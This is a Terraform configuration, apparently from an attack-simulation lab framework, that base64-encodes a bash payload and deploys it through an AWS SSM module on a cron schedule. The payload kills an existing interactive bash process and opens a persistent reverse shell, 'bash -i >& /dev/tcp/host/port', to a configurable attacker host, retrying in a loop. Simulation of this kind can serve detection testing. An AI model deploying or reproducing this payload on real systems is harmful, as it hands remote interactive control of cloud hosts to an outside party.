locals {
    host_ip = var.host_ip
    host_port = var.host_port

    payload = <<-EOT
    LOGFILE=/tmp/${var.tag}.log
    function log {
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
    }
    MAXLOG=2
    for i in `seq $((MAXLOG-1)) -1 1`; do mv "$LOGFILE."{$i,$((i+1))} 2>/dev/null || true; done
    mv $LOGFILE "$LOGFILE.1" 2>/dev/null || true
    check_package_manager() {
        pgrep -f "apt" || pgrep -f "dpkg" || pgrep -f "yum" || pgrep -f "rpm"
    }
    while check_package_manager; do
        log "Waiting for package manager to be available..."
        sleep 10
    done
    log "attacker Host: ${local.host_ip}:${local.host_port}"
    server="${local.host_ip}"
    timeout=600
    start_time=$(date +%s)
    # Check if $server is an IP address
    if [[ $server =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        log "server is set to IP address $server, no need to resolve DNS"
    else
        log "checking dns resolution: $server"
        while true; do
            ip=$(dig +short $server)
            if [ -z "$ip" ]; then  # If $ip is empty, the domain hasn't resolved yet
                current_time=$(date +%s)
                elapsed_time=$((current_time - start_time))
                if [ $elapsed_time -gt $timeout ]; then
                    echo "DNS resolution for $server timed out after $timeout seconds"
                    exit 1
                fi
                sleep 1
            else
                echo "$server resolved to $ip"
                break
            fi
        done
    fi
    kill -9 $(ps aux | grep '/bin/bash -c bash -i' | head -1 | awk '{ print $2 }')
    log "running: /bin/bash -c 'bash -i >& /dev/tcp/${local.host_ip}/${local.host_port} 0>&1'"
    while true; do
        log "reconnecting: ${local.host_ip}:${local.host_port}"
        while ! /bin/bash -c 'bash -i >& /dev/tcp/${local.host_ip}/${local.host_port} 0>&1'; do
            log "reconnecting: ${local.host_ip}:${local.host_port}";
            sleep 10;
        done;
        log "disconnected - wait retry...";
        sleep 60;
        log "starting retry...";
    done
    log "done"
    EOT
    base64_payload = base64encode(local.payload)
}

###########################
# SSM 
###########################

module "ssm" {
    source          = "../../../../../common/aws/ssm/base"
    environment     = var.environment
    deployment      = var.deployment
    tag             = var.tag
    timeout         = var.timeout
    cron            = var.cron
    base64_payload  = local.base64_payload
}